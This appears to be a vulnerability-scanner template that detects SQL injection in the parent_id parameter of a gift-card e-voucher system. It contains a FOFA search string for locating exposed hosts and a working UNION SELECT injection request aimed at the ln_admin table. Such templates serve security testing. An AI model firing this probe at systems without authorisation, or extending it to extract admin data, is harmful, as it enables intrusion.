id: poc-yaml-gceccs-parent-id-sqli
info:
  name: 礼品卡电子券收卡系统 parent_id SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 礼品卡电子券收卡系统
    fofa: body="/Application/Home/Static/css/style2.css"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,{{t2}},4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<option"
          - "{{t2}}"
      - type: word
        words:
          - "<html>"
        negative: true
